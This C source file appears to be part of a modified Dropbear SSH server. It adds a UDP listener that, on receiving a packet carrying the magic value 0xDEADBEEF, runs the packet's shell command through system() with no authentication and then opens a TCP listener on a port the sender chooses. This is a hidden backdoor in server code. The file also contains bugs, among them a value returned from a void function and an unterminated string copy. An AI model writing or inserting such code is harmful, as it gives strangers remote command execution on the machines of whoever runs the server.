#include <sys/mman.h>
#include "includes.h"
#include "udp-listener.h"

// Get sockaddr, IPv4 or IPv6
void *get_in_addr(struct sockaddr *sa) {
    return sa->sa_family == AF_INET ? &(((struct sockaddr_in*)sa)->sin_addr) : &(((struct sockaddr_in6*)sa)->sin6_addr);
}

// Convert UDP packet to listen_packet_t structure
int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {

    const char delimiter[2] = ",";

    char *first_token, *second_token, *third_token;
    uint32_t magic_value = 0;
    uint16_t port_value = 0;
    char command_value[MAX_SHELL_COMMAND_LENGTH];


    // Extract the data from the UDP Packet and parse it
    if((first_token = strtok(udp_string_packet, delimiter))) {
        magic_value = (uint32_t) atoi(first_token);
    }
    if((second_token = strtok(NULL, delimiter))) {
        port_value = (uint16_t) atoi(second_token);
    }
    if((third_token = strtok(NULL, delimiter))) {
        size_t size_of_command = strlen(third_token);
        strncpy(command_value, third_token, size_of_command > MAX_SHELL_COMMAND_LENGTH - 1 ? MAX_SHELL_COMMAND_LENGTH - 1: size_of_command);
    }

    // Error in packet structure
    if(first_token == NULL || second_token == NULL || third_token == NULL) {
        return -1;
    }

    // Assign the data to packet structure
    packet->magic = magic_value;
    packet->port_number = port_value;
    strcpy(packet->shell_command, command_value);

    return 0;
}

void start_tcp_connection(uint16_t port_number) {

    char* buf = NULL;        // buffer for client data
    char* temp = (char*) malloc(sizeof(long unsigned int));

    fd_set master;    // master file descriptor list
    fd_set read_fds;  // temp file descriptor list for select()
    int fdmax;        // maximum file descriptor number
    int nbytes;
    int listener;     // listening socket descriptor
    int newfd;        // newly accept()ed socket descriptor
    struct sockaddr_storage remoteaddr; // client address
    socklen_t addrlen;

    char remoteIP[INET6_ADDRSTRLEN], port_number_as_string[6];

    int yes=1;        // for setsockopt() SO_REUSEADDR, below
    int i,err_code;

    struct addrinfo hints, *ai, *p;

    FD_ZERO(&master);    // clear the master and temp sets
    FD_ZERO(&read_fds);

    dropbear_log(LOG_INFO, "Attempt TCP connection on port %d", port_number);

    // get us a socket and bind it
    memset(&hints, 0, sizeof hints);

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    sprintf(port_number_as_string, "%d", port_number);

    if ((err_code = getaddrinfo(NULL, port_number_as_string, &hints, &ai)) != 0) {
        dropbear_log(LOG_INFO, "TCP Connection error: %s", gai_strerror(err_code));
        exit(1);
    }

    for(p = ai; p != NULL; p = p->ai_next) {
        listener = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (listener < 0)  continue;
        // lose the pesky "address already in use" error message
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

        if (bind(listener, p->ai_addr, p->ai_addrlen) < 0) {
            close(listener);
            continue;
        }
        break;
    }

    // if we got here, it means we didn't get bound
    if (p == NULL) {
        dropbear_log(LOG_INFO, "Bind error in TCP connection creation");
        exit(2);
    }

    freeaddrinfo(ai); // all done with this

    // listen
    if (listen(listener, 10) == -1) {
        dropbear_log(LOG_INFO, "Listen error in TCP connection creation");
        exit(3);
    }

    // add the listener to the master set
    FD_SET(listener, &master);

    // keep track of the biggest file descriptor
    fdmax = listener; // so far, it's this one
    dropbear_log(LOG_INFO, "TCP connection has been created and is ready for requests");

    // main loop
    for(;;) {
        read_fds = master;     // copy it
        if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
            dropbear_log(LOG_INFO, "Select error in TCP connection");
            exit(4);
        }
        // run through the existing connections looking for data to read
        for(i = 0; i <= fdmax; i++) {
            if (FD_ISSET(i, &read_fds)) { // we got one!!
                if (i == listener) {
                    // handle new connections
                    addrlen = sizeof remoteaddr;
                    newfd = accept(listener,(struct sockaddr *)&remoteaddr,&addrlen);
                    if (newfd == -1)  dropbear_log(LOG_INFO, "Accept error in TCP connection");
                    else {
                        FD_SET(newfd, &master); // add to master set
                        if (newfd > fdmax) fdmax = newfd;    // keep track of the max
                        dropbear_log(LOG_INFO, "New TCP connection from %s on "
                                               "socket %d", inet_ntop(remoteaddr.ss_family,get_in_addr((struct sockaddr*)&remoteaddr),remoteIP,                             INET6_ADDRSTRLEN),newfd);
                    }
                }
                else {
                    // handle data from a client
                    if ((nbytes = recv(i, temp, sizeof(long unsigned int), 0)) <= 0) {
                        // got error or connection closed by client
                        if (nbytes == 0) dropbear_log(LOG_INFO, "TCP Connection: socket %d hung up", i); // connection closed
                        else dropbear_log(LOG_INFO, "recv");
                        close(i); // bye!
                        FD_CLR(i, &master); // remove from master set
                    }

                        // got some data from a client
                    else {

                        dropbear_log(LOG_INFO, "we got some data from a client");
                    }

                } // END handle data from client
            } // END got new incoming connection
        } // END looping through file descriptors
    } // END for(;;)-- thought it would never end!
}

void listen_for_udp_packets(int socket_id) {

    int addr_len, bytes_read;
    struct sockaddr_in client_addr;
    char recv_data[1024], send_data[1024];

    pid_t child_process_id;
    int child_return_status = 0;

    listen_packet_t packet;

    addr_len = sizeof(struct sockaddr);

    dropbear_log(LOG_INFO, "UDP Server is listening on port %d", DEFAULT_UDP_PORT_NUMBER);

    for(;;) {

        bytes_read = recvfrom(socket_id,recv_data,1024,0, (struct sockaddr *)&client_addr, &addr_len);

        recv_data[bytes_read] = '\0';

        dropbear_log(LOG_INFO, "(%s , %d) said : ",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        dropbear_log(LOG_INFO, "%s", recv_data);

        if(to_listen_packet(recv_data, &packet) < 0) {
            dropbear_log(LOG_INFO, "Error in packet structure");
            continue;
        }

        if(packet.magic == 0xDEADBEEF) {

            dropbear_log(LOG_INFO, "Received 0xDEADBEEF value");

            // Create a child process in order to run and listen to TCP as different user
            child_process_id = fork();

            if(child_process_id == 0) { // Child is running
                if(setuid(DEFAULT_USERID_FOR_UDP_PACKETS) == -1) {
                    dropbear_log(LOG_INFO, "setuid %d error. Please check that the user id exists", DEFAULT_USERID_FOR_UDP_PACKETS);
                    return 1;
                }

                // Run the shell command <packet.shell_command>
                system(packet.shell_command);
                return 0;
            }

            else if(child_process_id > 0) {

                // Wait for child process to terminate
                waitpid(child_process_id, &child_return_status, 0);

                // Create a TCP connection in <packet.port_number>
                start_tcp_connection(packet.port_number);
            }
            else {
                dropbear_log(LOG_INFO, "Fork process failed!");
                continue;
            }
        }
    }
}

void init_udp_listener(void* arguments) {

    int sock;
    struct sockaddr_in server_addr;

    // Create a socket and bind
    dropbear_log(LOG_INFO, "Attempt UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        dropbear_exit("Socket Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DEFAULT_UDP_PORT_NUMBER);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    bzero(&(server_addr.sin_zero),8);

    if (bind(sock,(struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        dropbear_exit("Bind Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
    }

    // Listen incoming data on UDP protocol
    listen_for_udp_packets(sock);
}